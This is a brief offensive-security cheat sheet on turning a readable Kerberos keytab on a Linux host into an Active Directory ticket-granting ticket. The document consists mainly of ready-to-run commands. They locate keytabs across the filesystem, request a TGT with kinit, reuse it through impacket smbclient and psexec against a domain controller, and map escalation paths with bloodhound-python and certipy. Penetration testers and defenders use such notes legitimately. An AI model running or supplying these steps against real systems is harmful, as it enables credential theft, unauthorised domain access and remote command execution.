# Kerberos Keytab → TGT for AD Access

A `.keytab` file stores Kerberos principal long-term keys. If a Linux service (e.g., SSH, NFS, web app) runs under an AD account and leaves a keytab readable, extract it to get a TGT and authenticate to AD without knowing the password.

```bash
# Find keytab files on Linux target
find / -name "*.keytab" -readable 2>/dev/null
find /etc /home /opt -name "krb5.keytab" -o -name "*.kt" 2>/dev/null

# Inspect keytab contents
klist -k /path/to/file.keytab

# Request TGT using the keytab
kinit -k -t /path/to/file.keytab <principal@DOMAIN.COM>
klist   # verify TGT

# Use TGT with impacket (convert to ccache if needed)
export KRB5CCNAME=/tmp/krb5cc_user
# Then use impacket tools with -k -no-pass:
impacket-smbclient -k -no-pass <DOMAIN>/<user>@<DC>
impacket-psexec -k -no-pass <DOMAIN>/<user>@<DC>
```

**Privilege check after TGT:**
```bash
# Enumerate with credentials to find escalation paths
bloodhound-python -d <DOMAIN> -k --dc <DC-FQDN> --no-pass -c All
# Or: check if the account has AD CS certificate enrollment rights (ESC1 etc.)
certipy find -k -no-pass -u <user>@<DOMAIN> -dc-ip <DC-IP>
```
